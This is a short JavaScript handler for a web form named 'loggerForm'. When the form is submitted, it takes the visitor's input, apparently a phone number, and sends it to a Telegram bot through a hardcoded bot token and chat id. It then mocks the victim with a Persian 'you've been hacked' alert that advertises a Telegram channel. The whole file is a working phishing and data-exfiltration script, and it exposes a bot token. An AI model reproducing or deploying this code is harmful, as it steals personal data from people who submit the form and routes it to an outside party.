document.getElementById("loggerForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Prevent form submission
  
    var data = document.getElementById("data").value; // Get the data from the input field
  
    // Send the data to the Telegram bot using the fetch API
    fetch("https://api.telegram.org/bot6693518588:AAEvOkPod4Um0HKc9LwduEDg_ayLG0HSxUQ/sendMessage", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: "6106577169",
        text: data
      })
    })
    .then(function(response) {
      if (response.ok) {
        alert("سلام شما هک شدید😂 ورود به کانال من: t.me/rmsup");
      } else {
        alert("لطفا شماره خود را صحیح وارد کنید🙏");
      }
    })
    .catch(function(error) {
      console.error("An error occurred:", error);
    });
  });